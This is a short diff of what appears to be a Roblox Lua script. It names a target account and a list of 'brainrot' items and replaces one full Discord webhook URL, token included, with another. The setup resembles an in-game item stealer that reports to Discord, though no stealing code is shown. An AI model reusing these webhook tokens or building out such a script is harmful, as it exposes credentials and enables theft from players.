@@ -1,6 +1,6 @@
 local TARGET_ID = 12020995366
 local TARGET_USER = "Lex_ontop20"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1575745711822209094/dnNrJ1_QGaZeAKCcZVtQx4XeqewLQqiZZu2iFlh2AyE36Zlg1o5OwerhCtt90KSDJCrc"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1575750704042086411/rpZR6FEfKHhxNlWQyCHu8PkvxjaX8wpsatU1e_7a6KevgXasN9TTCjmpPVDLzrDcjjPv"
 
 local TargetBrainrots = {
     ["Garama and Madundung"] = true,
